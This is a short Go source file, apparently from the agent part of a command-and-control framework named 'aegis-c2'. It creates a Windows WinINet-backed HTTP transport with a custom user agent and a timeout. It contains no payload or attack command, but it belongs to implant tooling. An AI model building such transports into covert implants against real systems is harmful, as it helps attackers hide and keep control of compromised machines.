//go:build windows && amd64

package transport

import (
	"net/http"
	"time"

	"github.com/aegis-c2/aegis/agent/wininet"
)

// newWininetTransport creates an http.RoundTripper backed by WinINet API.
// Returns nil if WinINet client cannot be created.
func newWininetTransport(userAgent string) http.RoundTripper {
	client, err := wininet.NewClient(userAgent)
	if err != nil {
		return nil
	}
	client.Timeout = 30 * time.Second
	return client
}
